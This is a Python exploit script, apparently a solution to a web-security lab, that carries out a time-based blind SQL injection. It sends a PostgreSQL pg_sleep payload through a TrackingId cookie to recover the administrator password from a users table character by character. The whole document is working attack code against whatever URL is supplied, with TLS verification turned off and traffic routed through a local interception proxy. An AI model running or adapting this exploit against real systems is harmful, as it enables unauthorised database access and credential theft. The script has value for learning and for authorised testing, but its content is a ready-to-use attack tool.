import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

FAIL = -1

def get_password(url):
    password = ""
    for position in range(1,21):
        for code in range(32,126):
            sqli_payload = (
                "' || (select case when (username='administrator' and "
                "ascii(substring(password,%s,1))='%s') then pg_sleep(10) "
                "else pg_sleep(-1) end from users)--" 
            ) % (position, code)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {
                'TrackingId': 'giXQIt0gnveDz98d' + sqli_payload_encoded,
                'session': 'SV8WXyL3kt8DgrYERpyjz8FbImrEPDuq'}
            response = requests.get(
                url, 
                cookies=cookies,
                verify=False,
                proxies=proxies)
            if int(response.elapsed.total_seconds()) > 9:
                password += chr(code)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password + chr(code))
                sys.stdout.flush()

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        print("(+) Retrieving administrator password...")
        get_password(url)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("An exception occured %s" % exception)
        print("[-] The SQLi attack was not successful.")
        sys.exit(FAIL)  